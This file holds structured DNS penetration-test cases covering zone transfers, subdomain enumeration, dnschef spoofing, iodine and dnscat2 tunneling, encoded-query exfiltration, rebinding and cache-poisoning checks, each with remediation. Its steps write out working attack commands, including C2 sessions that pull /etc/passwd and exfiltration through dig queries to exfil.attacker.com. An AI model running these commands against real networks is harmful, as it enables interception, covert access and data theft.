# DNS Attacks Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases organized by category and severity.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-------------|
| A. DNS Enumeration | 2 | MEDIUM - HIGH |
| B. DNS Spoofing | 1 | HIGH |
| C. DNS Tunneling | 2 | HIGH - CRITICAL |
| D. DNS C2 and Exfiltration | 1 | CRITICAL |
| **Total** | **6** | **MEDIUM - CRITICAL** |

---

## A. DNS Enumeration

### TC-DNS-001: DNS Zone Transfer (AXFR) Attempt

| Field | Value |
|------|-----|
| **ID** | TC-DNS-001 |
| **Name** | DNS Zone Transfer (AXFR) Attempt |
| **Category** | A. DNS Enumeration |
| **Severity** | HIGH |
| **Prerequisites** | Target domain name identified; nameservers enumerated via NS record lookup |
| **Test Steps** | 1. Enumerate all nameservers: `dig target.com NS +short`<br>2. Attempt zone transfer against each nameserver: `dig axfr target.com @ns1.target.com`<br>3. Repeat with dnsrecon: `dnsrecon -d target.com -t axfr`<br>4. Verify results with host: `host -l target.com ns1.target.com`<br>5. Document all records returned by successful zone transfers |
| **Expected Results** | Misconfigured nameserver returns full zone data including all A, AAAA, MX, CNAME, TXT, and internal records |
| **Actual Impact** | Complete DNS infrastructure exposure revealing internal hostnames, service mappings, network topology, and potentially sensitive TXT records |
| **Remediation** | Restrict AXFR to authorized secondary nameservers using allow-transfer ACLs; test all nameservers individually |

### TC-DNS-002: Subdomain Enumeration via Brute Force and Passive Discovery

| Field | Value |
|------|-----|
| **ID** | TC-DNS-002 |
| **Name** | Subdomain Enumeration via Brute Force and Passive Discovery |
| **Category** | A. DNS Enumeration |
| **Severity** | MEDIUM |
| **Prerequisites** | Target domain name identified; DNS wordlist available (dnsrecon/namelist.txt or SecLists) |
| **Test Steps** | 1. Run dnsenum for combined enumeration: `dnsenum --enum target.com`<br>2. Brute force subdomains with fierce: `fierce --domain target.com`<br>3. Run dnsrecon brute force: `dnsrecon -d target.com -t brte -D namelist.txt`<br>4. Enumerate SRV records: `dnsrecon -d target.com -t srv`<br>5. Perform reverse DNS on discovered IP ranges: `dnsrecon -t rvl -r 192.168.1.0/24`<br>6. Cross-reference results and remove duplicates |
| **Expected Results** | Discovery of subdomains not visible from public web browsing: dev, staging, internal services, VPN endpoints, mail servers |
| **Actual Impact** | Expanded attack surface map with subdomains revealing development environments, internal services, and forgotten infrastructure |
| **Remediation** | Use generic hostnames for internal services; deploy DNSSEC; consider split-horizon DNS to separate internal and external records |

---

## B. DNS Spoofing

### TC-DNS-003: DNS Spoofing with dnschef in MITM Attack

| Field | Value |
|------|-----|
| **ID** | TC-DNS-003 |
| **Name** | DNS Spoofing with dnschef in MITM Attack |
| **Category** | B. DNS Spoofing |
| **Severity** | HIGH |
| **Prerequisites** | Attacker on same network segment as victim; ARP spoofing tool available (arpspoof/Bettercap); dnschef installed |
| **Test Steps** | 1. Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`<br>2. Start ARP spoofing: `arpspoof -i eth0 -t 192.168.1.50 192.168.1.1`<br>3. Configure dnschef with target domains: `dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --fakedomain target.com`<br>4. Verify victim DNS queries are intercepted: monitor dnschef output<br>5. Confirm victim receives spoofed IP address for target domain<br>6. Verify victim traffic is redirected to attacker-controlled server |
| **Expected Results** | Victim's DNS queries for target domains resolve to attacker-specified IP addresses instead of legitimate addresses |
| **Actual Impact** | Attacker can redirect victim to phishing pages, capture credentials, intercept traffic, and perform man-in-the-middle attacks on any DNS-resolved service |
| **Remediation** | Deploy DNSSEC to authenticate DNS responses; use DNS-over-TLS or DNS-over-HTTPS; configure static DNS entries for critical services; implement ARP inspection on switches |

---

## C. DNS Tunneling

### TC-DNS-004: DNS Tunneling with iodine (IP-over-DNS)

| Field | Value |
|------|-----|
| **ID** | TC-DNS-004 |
| **Name** | DNS Tunneling with iodine (IP-over-DNS) |
| **Category** | C. DNS Tunneling |
| **Severity** | HIGH |
| **Prerequisites** | Attacker-controlled domain with authoritative DNS delegation; iodine installed on client and server; target network allows outbound DNS queries |
| **Test Steps** | 1. Configure authoritative DNS for tunnel domain pointing to attacker server<br>2. Start iodine server: `iodined -f -P secretpass 10.0.0.1/24 tunnel.attacker.com`<br>3. On restricted network, run iodine client: `iodine -f -P secretpass dns.attacker.com tunnel.attacker.com`<br>4. Verify tunnel interface is created with IP 10.0.0.2<br>5. Test connectivity: `ping 10.0.0.1`<br>6. Measure tunnel bandwidth: `iperf3 -c 10.0.0.1`<br>7. Route additional traffic through tunnel: `ip route add 192.168.100.0/24 via 10.0.0.1` |
| **Expected Results** | Full IP connectivity established between client and server tunneled entirely within DNS queries, bypassing network restrictions |
| **Actual Impact** | Attacker gains full network access through DNS channel, bypassing firewalls, captive portals, and egress filtering that block HTTP/HTTPS |
| **Remediation** | Implement DNS egress filtering to restrict outbound queries to authorized internal resolvers; monitor DNS query patterns for anomalous volume and long subdomain labels; block NULL and TXT record types in outbound DNS |

### TC-DNS-005: dnscat2 Encrypted C2 over DNS

| Field | Value |
|------|-----|
| **ID** | TC-DNS-005 |
| **Name** | dnscat2 Encrypted C2 over DNS |
| **Category** | C. DNS Tunneling |
| **Severity** | CRITICAL |
| **Prerequisites** | Attacker-controlled domain with authoritative DNS; dnscat2 server and client available; compromised host inside target network |
| **Test Steps** | 1. Start dnscat2 server: `ruby dnscat2.rb --secret=secretkey tunnel.attacker.com`<br>2. On compromised host, connect client: `./dnscat --secret secretkey tunnel.attacker.com`<br>3. Verify session established on server: `sessions`<br>4. Interact with session: `session -i 1`<br>5. Execute reconnaissance commands: `exec ifconfig`, `exec whoami`<br>6. Set up port forwarding: `listen 127.0.0.1:8888 10.0.0.5:80`<br>7. Transfer file from target: `download /etc/passwd`<br>8. Adjust stealth settings: `delay 5000`, `set dns_type TXT` |
| **Expected Results** | Encrypted command-and-control session established over DNS with ability to execute commands, transfer files, and tunnel connections |
| **Actual Impact** | Persistent, encrypted C2 channel that evades network monitoring and egress filtering, enabling ongoing access to compromised infrastructure |
| **Remediation** | Deploy DNS monitoring to detect anomalous query patterns (high frequency, long labels, consistent intervals); restrict DNS resolution to authorized servers; implement DNS-over-HTTPS inspection; block unauthorized DNS protocols |

---

## D. DNS C2 and Exfiltration

### TC-DNS-006: DNS Data Exfiltration via Encoded Queries

| Field | Value |
|------|-----|
| **ID** | TC-DNS-006 |
| **Name** | DNS Data Exfiltration via Encoded Queries |
| **Category** | D. DNS C2 and Exfiltration |
| **Severity** | CRITICAL |
| **Prerequisites** | Attacker-controlled authoritative DNS server; target network allows outbound DNS queries; data to exfiltrate identified on target system |
| **Test Steps** | 1. Set up DNS logging server on attacker infrastructure to capture all queries to exfil.attacker.com<br>2. On target system, encode data: `echo -n "sensitive_data" \| xxd -p`<br>3. Chunk encoded data into 30-character segments suitable for DNS labels<br>4. Transmit each chunk as DNS query: `dig <chunk>.exfil.attacker.com @attacker_dns`<br>5. Include sequence numbers for reassembly: `dig <seq>.<chunk>.exfil.attacker.com @attacker_dns`<br>6. On attacker server, parse collected DNS query logs and reassemble data in sequence order<br>7. Verify reassembled data matches original |
| **Expected Results** | Data successfully transmitted from target network to attacker server encoded within DNS query subdomain labels, completely bypassing HTTP/HTTPS monitoring |
| **Actual Impact** | Attacker can exfiltrate any data (credentials, documents, database contents) through DNS channels that are rarely monitored or logged, achieving stealthy data theft |
| **Remediation** | Monitor DNS query volume and subdomain label lengths (flag labels exceeding 20 characters); restrict outbound DNS to authorized internal resolvers; implement DNS query logging with anomaly detection; deploy DNS inspection for encoded data patterns |

---

## E. DNS Rebinding and Cache Poisoning

### TC-DNS-007: DNS Rebinding Attack Against Internal Services

| Field | Value |
|------|-----|
| **ID** | TC-DNS-007 |
| **Name** | DNS Rebinding Attack Against Internal Services |
| **Category** | E. DNS Rebinding and Cache Poisoning |
| **Severity** | CRITICAL |
| **Prerequisites** | Attacker-controlled authoritative DNS server; target application makes server-side HTTP requests based on user-supplied domain names; internal services accessible from the target application |
| **Objective** | Verify that DNS rebinding can bypass same-origin policy to access internal services through the target application |
| **Test Steps** | 1. Set up a DNS rebinding nameserver that alternates responses between attacker IP and target internal IP (e.g., 127.0.0.1)<br>2. Configure domain with TTL=0 pointing to the rebinding server<br>3. Submit the rebinding domain to the target application as a URL parameter<br>4. First DNS resolution returns attacker IP (serve exploit payload)<br>5. Second DNS resolution returns internal IP (application connects to internal service)<br>6. Verify the application fetches content from the internal service and returns it to the attacker<br>7. Test against cloud metadata endpoint: 169.254.169.254<br>8. Test against internal Redis: 127.0.0.1:6379 |
| **Expected Results** | The target application follows the DNS rebinding and makes requests to internal services, bypassing same-origin restrictions. Internal service responses are returned through the application to the attacker. Cloud metadata credentials or internal service data are successfully accessed |
| **Remediation** | Validate resolved IP addresses against blocklists (RFC 1918, loopback, link-local) before making outbound requests; disable DNS rebinding by pinning DNS results for the duration of a request; implement strict egress filtering on application servers |

### TC-DNS-008: DNS Cache Poisoning Resistance Verification

| Field | Value |
|------|-----|
| **ID** | TC-DNS-008 |
| **Name** | DNS Cache Poisoning Resistance Verification |
| **Category** | E. DNS Rebinding and Cache Poisoning |
| **Severity** | HIGH |
| **Prerequisites** | Target DNS resolver accessible for testing; ability to send crafted DNS responses; tcpdump/tshark available for traffic analysis |
| **Objective** | Verify that the target DNS resolver is resistant to cache poisoning attacks by testing source port randomization, transaction ID randomization, and DNSSEC validation |
| **Test Steps** | 1. Send 20 sequential DNS queries to the target resolver and capture responses: `for i in $(seq 1 20); do dig @ns1.target.com test$i.example.com A; done`<br>2. Capture source ports used by the resolver: `tcpdump -i eth0 -n port 53 -c 20 -w port_test.pcap`<br>3. Analyze source port diversity: `tshark -r port_test.pcap -Y "dns.qr==0" -T fields -e udp.srcport \| sort -u \| wc -l`<br>4. Verify DNSSEC validation: `dig +dnssec @ns1.target.com target.com A` (check for AD flag in response)<br>5. Check for 0x20 case randomization: `dig @ns1.target.com TaRgEt.CoM A` (verify mixed case preserved)<br>6. Document all findings and pass/fail status |
| **Expected Results** | Source port diversity is high (>15 unique ports out of 20 queries); transaction IDs appear random; DNSSEC validation is enabled (AD flag present); 0x20 case randomization is supported. If any check fails, the resolver may be vulnerable to cache poisoning |
| **Remediation** | Enable source port randomization on DNS resolvers; deploy DNSSEC validation on all recursive resolvers; implement 0x20 case randomization; update to current DNS server software versions with improved randomization; use DNS-over-TLS or DNS-over-HTTPS for forwarding queries |
| **Pass Criteria** | Source port diversity exceeds 75% unique ports; DNSSEC validation returns AD flag for signed zones; 0x20 encoding preserves mixed case in responses; no evidence of predictable transaction IDs |
